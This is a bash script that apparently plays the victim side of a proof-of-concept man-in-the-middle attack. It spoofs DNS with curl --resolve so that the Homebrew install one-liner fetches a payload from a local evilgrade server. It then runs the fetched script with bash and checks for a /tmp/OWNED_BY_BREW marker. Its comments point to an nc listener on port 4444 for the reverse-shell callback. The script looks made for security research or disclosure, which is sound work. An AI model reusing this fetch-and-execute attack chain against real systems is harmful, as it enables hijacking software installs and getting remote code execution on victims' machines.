#!/bin/bash
###############################################################################
# victim_brew.sh - VICTIM side only. Runs the genuine Homebrew install one-liner
#                  against an evilgrade you already started in another console.
#
# Does NOT start or stop evilgrade. Models the DNS spoof with curl --resolve.
#
# Usage:
#   demo/emudhra_mitm/victim_brew.sh [sslport]     (default 443)
#
# Before running, in the evilgrade console: homebrew_update enabled,
# sslcert certs/emudhra_mitm, started on <sslport>. Put a `nc -l 4444` in a
# third console (or set the module's lport) if you want to see the callback.
###############################################################################
set -u
PORT="${1:-443}"
HOST="raw.githubusercontent.com"
if [ "$PORT" = "443" ]; then
    HOSTS="$HOST:443:127.0.0.1"; URL="https://$HOST/Homebrew/install/HEAD/install.sh"
else
    HOSTS="$HOST:$PORT:127.0.0.1"; URL="https://$HOST:$PORT/Homebrew/install/HEAD/install.sh"
fi

rm -f /tmp/OWNED_BY_BREW
echo "== VICTIM: Homebrew install one-liner (-> evilgrade on :$PORT via DNS spoof) =="
echo "   \$ /bin/bash -c \"\$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)\""
if ! OUT=$(/usr/bin/curl -fsSL --resolve "$HOSTS" "$URL" 2>&1); then
    echo "   !! curl failed: $OUT"
    echo "   Is evilgrade started on :$PORT with homebrew_update enabled and sslcert certs/emudhra_mitm?"
    exit 1
fi
/bin/bash -c "$OUT" 2>&1 | sed 's/^/   /'
sleep 1
echo
echo "== PROOF: /tmp/OWNED_BY_BREW =="
[ -f /tmp/OWNED_BY_BREW ] && sed 's/^/   /' /tmp/OWNED_BY_BREW || echo "   <not created>"
